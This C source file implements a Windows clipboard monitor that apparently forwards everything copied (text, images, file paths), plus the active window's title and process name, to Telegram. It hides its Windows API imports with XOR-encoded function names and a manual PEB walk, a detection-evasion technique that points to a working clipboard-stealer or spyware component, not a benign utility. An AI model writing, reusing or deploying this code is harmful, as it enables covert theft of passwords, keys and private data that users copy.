/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0600

#include "../config/config.h"
#include "../logging/logging.h"
#include "../runtime/runtime.h"
#include "clipboard.h"
#include "clipboard_output.h"

#include <windows.h>
#include <shellapi.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct {
  DWORD files_offset;
  POINT drop_point;
  BOOL non_client;
  BOOL wide;
} c2t_dropfiles_t;

typedef DWORD(WINAPI *pfn_GetWindowThreadProcessId)(HWND hWnd,
                                                    LPDWORD lpdwProcessId);
typedef BOOL(WINAPI *pfn_OpenClipboard)(HWND hWndNewOwner);
typedef BOOL(WINAPI *pfn_CloseClipboard)(VOID);
typedef HANDLE(WINAPI *pfn_GetClipboardData)(UINT uFormat);
typedef BOOL(WINAPI *pfn_IsClipboardFormatAvailable)(UINT format);
typedef BOOL(WINAPI *pfn_AddClipboardFormatListener)(HWND hwnd);
typedef BOOL(WINAPI *pfn_RemoveClipboardFormatListener)(HWND hwnd);
typedef HWND(WINAPI *pfn_GetForegroundWindow)(VOID);
typedef int(WINAPI *pfn_GetWindowTextW)(HWND hWnd, LPWSTR lpString, int nMaxCount);
typedef HWND(WINAPI *pfn_CreateWindowExW)(DWORD dwExStyle, LPCWSTR lpClassName,
                                          LPCWSTR lpWindowName, DWORD dwStyle,
                                          int X, int Y, int nWidth, int nHeight,
                                          HWND hWndParent, HMENU hMenu,
                                          HINSTANCE hInstance, LPVOID lpParam);
typedef BOOL(WINAPI *pfn_DestroyWindow)(HWND hWnd);
typedef ATOM(WINAPI *pfn_RegisterClassW)(const WNDCLASSW *lpWndClass);
typedef BOOL(WINAPI *pfn_UnregisterClassW)(LPCWSTR lpClassName, HINSTANCE hInstance);
typedef LRESULT(WINAPI *pfn_DefWindowProcW)(HWND hWnd, UINT Msg, WPARAM wParam,
                                            LPARAM lParam);
typedef BOOL(WINAPI *pfn_PeekMessageW)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                                       UINT wMsgFilterMax, UINT wRemoveMsg);
typedef BOOL(WINAPI *pfn_TranslateMessage)(const MSG *lpMsg);
typedef LRESULT(WINAPI *pfn_DispatchMessageW)(const MSG *lpMsg);

typedef struct {
  pfn_GetWindowThreadProcessId GetWindowThreadProcessId;
  pfn_OpenClipboard OpenClipboard;
  pfn_CloseClipboard CloseClipboard;
  pfn_GetClipboardData GetClipboardData;
  pfn_IsClipboardFormatAvailable IsClipboardFormatAvailable;
  pfn_AddClipboardFormatListener AddClipboardFormatListener;
  pfn_RemoveClipboardFormatListener RemoveClipboardFormatListener;
  pfn_GetForegroundWindow GetForegroundWindow;
  pfn_GetWindowTextW GetWindowTextW;
  pfn_CreateWindowExW CreateWindowExW;
  pfn_DestroyWindow DestroyWindow;
  pfn_RegisterClassW RegisterClassW;
  pfn_UnregisterClassW UnregisterClassW;
  pfn_DefWindowProcW DefWindowProcW;
  pfn_PeekMessageW PeekMessageW;
  pfn_TranslateMessage TranslateMessage;
  pfn_DispatchMessageW DispatchMessageW;
} c2t_user32_api_t;

static c2t_user32_api_t g_user32 = {0};
static int g_user32_initialized = 0;

static inline void c2t_xor_decode_cb(char *dest, const unsigned char *src,
                                     size_t len, unsigned char key) {
  for (size_t i = 0; i < len; ++i) {
    dest[i] = (char)(src[i] ^ key);
  }
  dest[len] = '\0';
}

typedef struct _C2T_UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR Buffer;
} C2T_UNICODE_STRING;

typedef struct _C2T_LDR_DATA_TABLE_ENTRY {
  LIST_ENTRY InLoadOrderLinks;
  LIST_ENTRY InMemoryOrderLinks;
  LIST_ENTRY InInitializationOrderLinks;
  PVOID DllBase;
  PVOID EntryPoint;
  ULONG SizeOfImage;
  C2T_UNICODE_STRING FullDllName;
  C2T_UNICODE_STRING BaseDllName;
} C2T_LDR_DATA_TABLE_ENTRY;

typedef struct _C2T_PEB_LDR_DATA {
  ULONG Length;
  BOOLEAN Initialized;
  HANDLE SsHandle;
  LIST_ENTRY InLoadOrderModuleList;
  LIST_ENTRY InMemoryOrderModuleList;
  LIST_ENTRY InInitializationOrderModuleList;
} C2T_PEB_LDR_DATA;

typedef struct _C2T_PEB {
  BOOLEAN InheritedAddressSpace;
  BOOLEAN ReadImageFileExecOptions;
  BOOLEAN BeingDebugged;
  BOOLEAN BitField;
  HANDLE Mutant;
  PVOID ImageBaseAddress;
  C2T_PEB_LDR_DATA *Ldr;
} C2T_PEB;

static HMODULE c2t_get_module_handle_peb(const wchar_t *module_name) {
#if defined(_WIN64)
  C2T_PEB *peb = (C2T_PEB *)__readgsqword(0x60);
#elif defined(_WIN32)
  C2T_PEB *peb = (C2T_PEB *)__readfsdword(0x30);
#else
  C2T_PEB *peb = nullptr;
#endif
  if (!peb || !peb->Ldr)
    return nullptr;

  PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
  PLIST_ENTRY curr = head->Flink;

  while (curr && curr != head) {
    C2T_LDR_DATA_TABLE_ENTRY *entry =
        CONTAINING_RECORD(curr, C2T_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
    if (entry->BaseDllName.Buffer) {
      if (_wcsicmp(entry->BaseDllName.Buffer, module_name) == 0) {
        return (HMODULE)entry->DllBase;
      }
    }
    curr = curr->Flink;
  }
  return nullptr;
}

static void c2t_init_user32_apis(void) {
  if (g_user32_initialized)
    return;

  static const unsigned char enc_u32[] = {47, 41, 63, 40, 105, 104, 116, 62, 54, 54};
  char u32_buf[16];
  c2t_xor_decode_cb(u32_buf, enc_u32, sizeof(enc_u32), 0x5A);

  HMODULE hUser32 = c2t_get_module_handle_peb(L"user32.dll");
  if (!hUser32)
    hUser32 = GetModuleHandleA(u32_buf);
  if (!hUser32)
    hUser32 = LoadLibraryA(u32_buf);

  if (hUser32) {
#define LOAD_USER32_API(name, enc_arr)                                         \
    do {                                                                       \
      char fn_buf[64];                                                         \
      c2t_xor_decode_cb(fn_buf, enc_arr, sizeof(enc_arr), 0x5A);               \
      FARPROC proc = GetProcAddress(hUser32, fn_buf);                          \
      memcpy(&g_user32.name, &proc, sizeof(g_user32.name));                   \
    } while (0)

    static const unsigned char enc_GetWindowThreadProcessId[] = {
        29, 63, 46, 13, 51, 52, 62, 53, 45, 14, 50, 40,
        63, 59, 62, 10, 40, 53, 57, 63, 41, 41, 19, 62};
    static const unsigned char enc_OpenClipboard[] = {
        21, 42, 63, 52, 25, 54, 51, 42, 56, 53, 59, 40, 62};
    static const unsigned char enc_CloseClipboard[] = {
        25, 54, 53, 41, 63, 25, 54, 51, 42, 56, 53, 59, 40, 62};
    static const unsigned char enc_GetClipboardData[] = {
        29, 63, 46, 25, 54, 51, 42, 56, 53, 59, 40, 62, 30, 59, 46, 59};
    static const unsigned char enc_IsClipboardFormatAvailable[] = {
        19, 41, 25, 54, 51, 42, 56, 53, 59, 40, 62, 28, 53,
        40, 55, 59, 46, 27, 44, 59, 51, 54, 59, 56, 54, 63};
    static const unsigned char enc_AddClipboardFormatListener[] = {
        27, 62, 62, 25, 54, 51, 42, 56, 53, 59, 40, 62, 28, 53,
        40, 55, 59, 46, 22, 51, 41, 46, 63, 52, 63, 40};
    static const unsigned char enc_RemoveClipboardFormatListener[] = {
        8,  63, 55, 53, 44, 63, 25, 54, 51, 42, 56, 53, 59, 40, 62,
        28, 53, 40, 55, 59, 46, 22, 51, 41, 46, 63, 52, 63, 40};
    static const unsigned char enc_GetForegroundWindow[] = {
        29, 63, 46, 28, 53, 40, 63, 61, 40, 53, 47, 52, 62, 13, 51, 52, 62, 53, 45};
    static const unsigned char enc_GetWindowTextW[] = {
        29, 63, 46, 13, 51, 52, 62, 53, 45, 14, 63, 34, 46, 13};
    static const unsigned char enc_CreateWindowExW[] = {
        25, 40, 63, 59, 46, 63, 13, 51, 52, 62, 53, 45, 31, 34, 13};
    static const unsigned char enc_DestroyWindow[] = {
        30, 63, 41, 46, 40, 53, 35, 13, 51, 52, 62, 53, 45};
    static const unsigned char enc_RegisterClassW[] = {
        8, 63, 61, 51, 41, 46, 63, 40, 25, 54, 59, 41, 41, 13};
    static const unsigned char enc_UnregisterClassW[] = {
        15, 52, 40, 63, 61, 51, 41, 46, 63, 40, 25, 54, 59, 41, 41, 13};
    static const unsigned char enc_DefWindowProcW[] = {
        30, 63, 60, 13, 51, 52, 62, 53, 45, 10, 40, 53, 57, 13};
    static const unsigned char enc_PeekMessageW[] = {
        10, 63, 63, 49, 23, 63, 41, 41, 59, 61, 63, 13};
    static const unsigned char enc_TranslateMessage[] = {
        14, 40, 59, 52, 41, 54, 59, 46, 63, 23, 63, 41, 41, 59, 61, 63};
    static const unsigned char enc_DispatchMessageW[] = {
        30, 51, 41, 42, 59, 46, 57, 50, 23, 63, 41, 41, 59, 61, 63, 13};

    LOAD_USER32_API(GetWindowThreadProcessId, enc_GetWindowThreadProcessId);
    LOAD_USER32_API(OpenClipboard, enc_OpenClipboard);
    LOAD_USER32_API(CloseClipboard, enc_CloseClipboard);
    LOAD_USER32_API(GetClipboardData, enc_GetClipboardData);
    LOAD_USER32_API(IsClipboardFormatAvailable, enc_IsClipboardFormatAvailable);
    LOAD_USER32_API(AddClipboardFormatListener, enc_AddClipboardFormatListener);
    LOAD_USER32_API(RemoveClipboardFormatListener, enc_RemoveClipboardFormatListener);
    LOAD_USER32_API(GetForegroundWindow, enc_GetForegroundWindow);
    LOAD_USER32_API(GetWindowTextW, enc_GetWindowTextW);
    LOAD_USER32_API(CreateWindowExW, enc_CreateWindowExW);
    LOAD_USER32_API(DestroyWindow, enc_DestroyWindow);
    LOAD_USER32_API(RegisterClassW, enc_RegisterClassW);
    LOAD_USER32_API(UnregisterClassW, enc_UnregisterClassW);
    LOAD_USER32_API(DefWindowProcW, enc_DefWindowProcW);
    LOAD_USER32_API(PeekMessageW, enc_PeekMessageW);
    LOAD_USER32_API(TranslateMessage, enc_TranslateMessage);
    LOAD_USER32_API(DispatchMessageW, enc_DispatchMessageW);
#undef LOAD_USER32_API
  }

  g_user32_initialized = 1;
}

static DWORD c2t_GetWindowThreadProcessId(HWND hWnd, LPDWORD lpdwProcessId) {
  c2t_init_user32_apis();
  if (g_user32.GetWindowThreadProcessId)
    return g_user32.GetWindowThreadProcessId(hWnd, lpdwProcessId);
  return 0;
}

static BOOL c2t_OpenClipboard(HWND hWndNewOwner) {
  c2t_init_user32_apis();
  if (g_user32.OpenClipboard)
    return g_user32.OpenClipboard(hWndNewOwner);
  return FALSE;
}

static BOOL c2t_CloseClipboard(VOID) {
  c2t_init_user32_apis();
  if (g_user32.CloseClipboard)
    return g_user32.CloseClipboard();
  return FALSE;
}

static HANDLE c2t_GetClipboardData(UINT uFormat) {
  c2t_init_user32_apis();
  if (g_user32.GetClipboardData)
    return g_user32.GetClipboardData(uFormat);
  return NULL;
}

static BOOL c2t_IsClipboardFormatAvailable(UINT format) {
  c2t_init_user32_apis();
  if (g_user32.IsClipboardFormatAvailable)
    return g_user32.IsClipboardFormatAvailable(format);
  return FALSE;
}

static BOOL c2t_AddClipboardFormatListener(HWND hwnd) {
  c2t_init_user32_apis();
  if (g_user32.AddClipboardFormatListener)
    return g_user32.AddClipboardFormatListener(hwnd);
  return FALSE;
}

static BOOL c2t_RemoveClipboardFormatListener(HWND hwnd) {
  c2t_init_user32_apis();
  if (g_user32.RemoveClipboardFormatListener)
    return g_user32.RemoveClipboardFormatListener(hwnd);
  return FALSE;
}

static HWND c2t_GetForegroundWindow(VOID) {
  c2t_init_user32_apis();
  if (g_user32.GetForegroundWindow)
    return g_user32.GetForegroundWindow();
  return NULL;
}

static int c2t_GetWindowTextW(HWND hWnd, LPWSTR lpString, int nMaxCount) {
  c2t_init_user32_apis();
  if (g_user32.GetWindowTextW)
    return g_user32.GetWindowTextW(hWnd, lpString, nMaxCount);
  return 0;
}

static HWND c2t_CreateWindowExW(DWORD dwExStyle, LPCWSTR lpClassName,
                                LPCWSTR lpWindowName, DWORD dwStyle, int X,
                                int Y, int nWidth, int nHeight, HWND hWndParent,
                                HMENU hMenu, HINSTANCE hInstance,
                                LPVOID lpParam) {
  c2t_init_user32_apis();
  if (g_user32.CreateWindowExW)
    return g_user32.CreateWindowExW(dwExStyle, lpClassName, lpWindowName,
                                    dwStyle, X, Y, nWidth, nHeight, hWndParent,
                                    hMenu, hInstance, lpParam);
  return NULL;
}

static BOOL c2t_DestroyWindow(HWND hWnd) {
  c2t_init_user32_apis();
  if (g_user32.DestroyWindow)
    return g_user32.DestroyWindow(hWnd);
  return FALSE;
}

static ATOM c2t_RegisterClassW(const WNDCLASSW *lpWndClass) {
  c2t_init_user32_apis();
  if (g_user32.RegisterClassW)
    return g_user32.RegisterClassW(lpWndClass);
  return 0;
}

static BOOL c2t_UnregisterClassW(LPCWSTR lpClassName, HINSTANCE hInstance) {
  c2t_init_user32_apis();
  if (g_user32.UnregisterClassW)
    return g_user32.UnregisterClassW(lpClassName, hInstance);
  return FALSE;
}

static LRESULT c2t_DefWindowProcW(HWND hWnd, UINT Msg, WPARAM wParam,
                                  LPARAM lParam) {
  c2t_init_user32_apis();
  if (g_user32.DefWindowProcW)
    return g_user32.DefWindowProcW(hWnd, Msg, wParam, lParam);
  return 0;
}

static BOOL c2t_PeekMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                             UINT wMsgFilterMax, UINT wRemoveMsg) {
  c2t_init_user32_apis();
  if (g_user32.PeekMessageW)
    return g_user32.PeekMessageW(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax,
                                 wRemoveMsg);
  return FALSE;
}

static BOOL c2t_TranslateMessage(const MSG *lpMsg) {
  c2t_init_user32_apis();
  if (g_user32.TranslateMessage)
    return g_user32.TranslateMessage(lpMsg);
  return FALSE;
}

static LRESULT c2t_DispatchMessageW(const MSG *lpMsg) {
  c2t_init_user32_apis();
  if (g_user32.DispatchMessageW)
    return g_user32.DispatchMessageW(lpMsg);
  return 0;
}

static void wide_to_utf8(const wchar_t *wide, char *output, size_t capacity) {
  output[0] = '\0';
  int required =
      WideCharToMultiByte(CP_UTF8, 0, wide, -1, nullptr, 0, nullptr, nullptr);
  char *converted = required > 0 ? malloc((size_t)required) : nullptr;
  if (!converted || !WideCharToMultiByte(CP_UTF8, 0, wide, -1, converted,
                                         required, nullptr, nullptr)) {
    free(converted);
    return;
  }

  size_t length = (size_t)required - 1;
  size_t copied = length < capacity - 1 ? length : capacity - 1;
  if (copied < length) {
    while (copied > 0 && ((unsigned char)converted[copied] & 0xc0) == 0x80)
      --copied;
  }
  memcpy(output, converted, copied);
  output[copied] = '\0';
  free(converted);
}

[[nodiscard]] static int capture_source(c2t_clipboard_source_t *source) {
  memset(source, 0, sizeof(*source));
  if (!c2t_config_get()->telegram_send_window_info)
    return 0;

  HWND source_window = c2t_GetForegroundWindow();
  if (!source_window)
    return 0;

  wchar_t title[512] = {};
  int title_length = c2t_GetWindowTextW(source_window, title,
                                     (int)(sizeof(title) / sizeof(title[0])));
  if (title_length > 0)
    wide_to_utf8(title, source->title, sizeof(source->title));

  DWORD process_id = 0;
  c2t_GetWindowThreadProcessId(source_window, &process_id);
  source->process_id = (uint32_t)process_id;
  HANDLE process = process_id ? OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                            FALSE, process_id)
                              : nullptr;
  if (process) {
    wchar_t path[32768] = {};
    DWORD path_length = (DWORD)(sizeof(path) / sizeof(path[0]));
    if (QueryFullProcessImageNameW(process, 0, path, &path_length) &&
        path_length < (DWORD)(sizeof(path) / sizeof(path[0]))) {
      path[path_length] = L'\0';
      const wchar_t *name = path;
      for (const wchar_t *cursor = path; *cursor; ++cursor) {
        if (*cursor == L'\\' || *cursor == L'/')
          name = cursor + 1;
      }
      wide_to_utf8(name, source->application, sizeof(source->application));
    }
    CloseHandle(process);
  }
  return source->application[0] || source->title[0] || source->process_id;
}

static void write_u16_le(unsigned char *output, uint16_t value) {
  output[0] = (unsigned char)(value & 0xff);
  output[1] = (unsigned char)((value >> 8) & 0xff);
}

static void write_u32_le(unsigned char *output, uint32_t value) {
  output[0] = (unsigned char)(value & 0xff);
  output[1] = (unsigned char)((value >> 8) & 0xff);
  output[2] = (unsigned char)((value >> 16) & 0xff);
  output[3] = (unsigned char)((value >> 24) & 0xff);
}

[[nodiscard]] static int output_bitmap(UINT format,
                                       const c2t_clipboard_source_t *source) {
  c2t_log_debug("windows", "Reading bitmap clipboard format %u", format);
  HANDLE handle = c2t_GetClipboardData(format);
  const BITMAPINFOHEADER *info = handle ? GlobalLock(handle) : nullptr;
  SIZE_T dib_size = handle ? GlobalSize(handle) : 0;
  if (!info || dib_size < sizeof(BITMAPINFOHEADER) ||
      info->biSize < sizeof(BITMAPINFOHEADER) || info->biSize > dib_size ||
      dib_size > UINT32_MAX - 14) {
    if (info)
      GlobalUnlock(handle);
    return 0;
  }

  size_t color_bytes = 0;
  if (info->biSize == sizeof(BITMAPINFOHEADER) &&
      info->biCompression == BI_BITFIELDS)
    color_bytes += 3 * sizeof(DWORD);
  if ((size_t)info->biSize + color_bytes > (size_t)dib_size) {
    GlobalUnlock(handle);
    return 0;
  }
  if (info->biClrUsed) {
    if ((size_t)info->biClrUsed >
        ((size_t)dib_size - (size_t)info->biSize - color_bytes) /
            sizeof(RGBQUAD)) {
      GlobalUnlock(handle);
      return 0;
    }
    color_bytes += (size_t)info->biClrUsed * sizeof(RGBQUAD);
  } else if (info->biBitCount <= 8) {
    color_bytes += ((size_t)1 << info->biBitCount) * sizeof(RGBQUAD);
  }

  size_t pixel_offset = 14 + (size_t)info->biSize + color_bytes;
  size_t file_size = 14 + (size_t)dib_size;
  if (pixel_offset > file_size || file_size > UINT32_MAX ||
      file_size > c2t_config_get()->queue_max_bytes) {
    c2t_log_warning("windows", "Bitmap exceeds the delivery queue limit");
    GlobalUnlock(handle);
    return 0;
  }

  unsigned char *bitmap = malloc(file_size);
  if (!bitmap) {
    GlobalUnlock(handle);
    return 0;
  }
  bitmap[0] = 'B';
  bitmap[1] = 'M';
  write_u32_le(bitmap + 2, (uint32_t)file_size);
  write_u16_le(bitmap + 6, 0);
  write_u16_le(bitmap + 8, 0);
  write_u32_le(bitmap + 10, (uint32_t)pixel_offset);
  memcpy(bitmap + 14, info, (size_t)dib_size);
  GlobalUnlock(handle);

  clipboard_output(bitmap, file_size, "image/bmp", source);
  free(bitmap);
  return 1;
}

static void output_text(const c2t_clipboard_source_t *source) {
  c2t_log_debug("windows", "Reading Unicode text from clipboard");
  HANDLE handle = c2t_GetClipboardData(CF_UNICODETEXT);

  const wchar_t *wide_text = handle ? GlobalLock(handle) : nullptr;
  SIZE_T byte_size = handle ? GlobalSize(handle) : 0;
  if (!wide_text)
    return;
  if (byte_size < sizeof(wchar_t)) {
    GlobalUnlock(handle);
    return;
  }

  size_t capacity = (size_t)byte_size / sizeof(wchar_t);
  size_t wide_length = 0;
  while (wide_length < capacity && wide_text[wide_length])
    ++wide_length;
  if (wide_length == capacity || wide_length > INT32_MAX) {
    c2t_log_warning("windows", "Ignoring unterminated clipboard text");
    GlobalUnlock(handle);
    return;
  }
  int utf8_size = WideCharToMultiByte(CP_UTF8, 0, wide_text, (int)wide_length,
                                      nullptr, 0, nullptr, nullptr);
  if (utf8_size < 0 || (size_t)utf8_size > c2t_config_get()->queue_max_bytes) {
    c2t_log_warning("windows", "Text exceeds the delivery queue limit");
    GlobalUnlock(handle);
    return;
  }
  char *utf8 = utf8_size > 0 ? malloc((size_t)utf8_size) : nullptr;
  if (utf8 && WideCharToMultiByte(CP_UTF8, 0, wide_text, (int)wide_length, utf8,
                                  utf8_size, nullptr, nullptr)) {
    clipboard_output(utf8, (size_t)utf8_size, "text/plain;charset=utf-8",
                     source);
  }

  free(utf8);
  GlobalUnlock(handle);
}

[[nodiscard]] static int
output_wide_file(const wchar_t *wide, int wide_length,
                 const c2t_clipboard_source_t *source) {
  int utf8_length = WideCharToMultiByte(CP_UTF8, 0, wide, wide_length, nullptr,
                                        0, nullptr, nullptr);
  if (utf8_length < 0 ||
      (size_t)utf8_length > c2t_config_get()->queue_max_bytes) {
    c2t_log_warning("windows", "File path exceeds the delivery queue limit");
    return 0;
  }
  char *utf8 = utf8_length > 0 ? malloc((size_t)utf8_length) : nullptr;
  if (!utf8 || !WideCharToMultiByte(CP_UTF8, 0, wide, wide_length, utf8,
                                    utf8_length, nullptr, nullptr)) {
    free(utf8);
    return 0;
  }
  clipboard_output(utf8, (size_t)utf8_length, "text/uri-list", source);
  free(utf8);
  return 1;
}

[[nodiscard]] static int output_files(const c2t_clipboard_source_t *source) {
  HANDLE handle = c2t_GetClipboardData(CF_HDROP);
  const c2t_dropfiles_t *drop = handle ? GlobalLock(handle) : nullptr;
  SIZE_T total_size = handle ? GlobalSize(handle) : 0;
  if (!drop || total_size < sizeof(*drop) || drop->files_offset >= total_size) {
    if (drop)
      GlobalUnlock(handle);
    return 0;
  }

  const unsigned char *cursor =
      (const unsigned char *)drop + drop->files_offset;
  SIZE_T remaining = total_size - drop->files_offset;
  int handled = 0;
  if (drop->wide) {
    while (remaining >= sizeof(wchar_t)) {
      const wchar_t *wide = (const wchar_t *)cursor;
      size_t wide_capacity = remaining / sizeof(wchar_t);
      size_t length = 0;
      while (length < wide_capacity && wide[length])
        ++length;
      if (length == 0 || length == wide_capacity || length > INT32_MAX)
        break;
      handled |= output_wide_file(wide, (int)length, source);
      size_t consumed = (length + 1) * sizeof(wchar_t);
      cursor += consumed;
      remaining -= consumed;
    }
  } else {
    while (remaining > 0) {
      const unsigned char *terminator = memchr(cursor, '\0', remaining);
      if (!terminator)
        break;
      size_t length = (size_t)(terminator - cursor);
      if (length <= INT32_MAX) {
        int wide_length = MultiByteToWideChar(CP_ACP, 0, (const char *)cursor,
                                              (int)length, nullptr, 0);
        wchar_t *wide = wide_length > 0
                            ? malloc((size_t)wide_length * sizeof(*wide))
                            : nullptr;
        if (wide && MultiByteToWideChar(CP_ACP, 0, (const char *)cursor,
                                        (int)length, wide, wide_length))
          handled |= output_wide_file(wide, wide_length, source);
        free(wide);
      }
      size_t consumed = length + 1;
      cursor += consumed;
      remaining -= consumed;
    }
  }
  GlobalUnlock(handle);
  return handled;
}

static void output_clipboard(void) {
  c2t_clipboard_source_t source = {};
  const c2t_clipboard_source_t *source_pointer =
      capture_source(&source) ? &source : nullptr;
  int opened = 0;
  for (unsigned int attempt = 0; attempt < 5 && !opened; ++attempt) {
    opened = c2t_OpenClipboard(nullptr);
    if (!opened && attempt < 4)
      Sleep(10U << attempt);
  }
  if (!opened) {
    c2t_log_warning("windows", "Unable to open clipboard (error %lu)",
                    (unsigned long)GetLastError());
    return;
  }

  int handled = 0;
  if (c2t_config_get()->telegram_send_files &&
      c2t_IsClipboardFormatAvailable(CF_HDROP))
    handled = output_files(source_pointer);
#ifdef CF_DIBV5
  if (!handled && c2t_IsClipboardFormatAvailable(CF_DIBV5))
    handled = output_bitmap(CF_DIBV5, source_pointer);
#endif
  if (!handled && c2t_IsClipboardFormatAvailable(CF_DIB))
    handled = output_bitmap(CF_DIB, source_pointer);
  if (!handled && c2t_IsClipboardFormatAvailable(CF_UNICODETEXT))
    output_text(source_pointer);

  c2t_CloseClipboard();
}

static LRESULT CALLBACK window_callback(HWND window, UINT message,
                                        WPARAM wparam, LPARAM lparam) {
  if (message == WM_CLIPBOARDUPDATE) {
    c2t_log_debug("windows", "Clipboard update event received");
    output_clipboard();
    return 0;
  }

  return c2t_DefWindowProcW(window, message, wparam, lparam);
}

static int clipboard_listen_once(void) {
  c2t_log_debug("windows", "Creating clipboard listener window");
  static const wchar_t class_name[] = L"c2c_clipboard_listener";
  HINSTANCE instance = GetModuleHandleW(nullptr);
  WNDCLASSW window_class = {.lpfnWndProc = window_callback,
                            .hInstance = instance,
                            .lpszClassName = class_name};

  if (!c2t_RegisterClassW(&window_class)) {
    c2t_log_error("windows",
                  "Unable to register clipboard listener (error %lu)",
                  (unsigned long)GetLastError());
    return 1;
  }

  HWND window = c2t_CreateWindowExW(0, class_name, L"", 0, 0, 0, 0, 0, HWND_MESSAGE,
                                nullptr, instance, nullptr);
  if (!window) {
    c2t_log_error("windows", "Unable to create clipboard listener (error %lu)",
                  (unsigned long)GetLastError());
    c2t_UnregisterClassW(class_name, instance);
    return 1;
  }

  if (!c2t_AddClipboardFormatListener(window)) {
    c2t_log_error("windows", "Unable to listen to clipboard (error %lu)",
                  (unsigned long)GetLastError());
    c2t_DestroyWindow(window);
    c2t_UnregisterClassW(class_name, instance);
    return 1;
  }

  c2t_log_info("windows", "Listening for clipboard updates");

  MSG message = {};
  int result = 0;
  while (!c2t_runtime_stop_requested()) {
    while (c2t_PeekMessageW(&message, nullptr, 0, 0, PM_REMOVE)) {
      if (message.message == WM_QUIT)
        goto message_loop_finished;
      c2t_TranslateMessage(&message);
      c2t_DispatchMessageW(&message);
    }
    Sleep(100);
  }

message_loop_finished:
  c2t_RemoveClipboardFormatListener(window);
  c2t_DestroyWindow(window);
  c2t_UnregisterClassW(class_name, instance);
  return result == 0 ? 0 : 2;
}

int clipboard_listen(void) {
  unsigned int retry = 0;
  while (!c2t_runtime_stop_requested()) {
    int result = clipboard_listen_once();
    if (result != 2)
      return result;
    unsigned int delay = retry < 5 ? 1U << retry : 30U;
    if (retry < 5)
      ++retry;
    c2t_log_warning("windows", "Restarting clipboard listener in %u seconds",
                    delay);
    for (unsigned int elapsed = 0;
         elapsed < delay * 1000U && !c2t_runtime_stop_requested();
         elapsed += 100U)
      Sleep(100);
  }
  return 0;
}
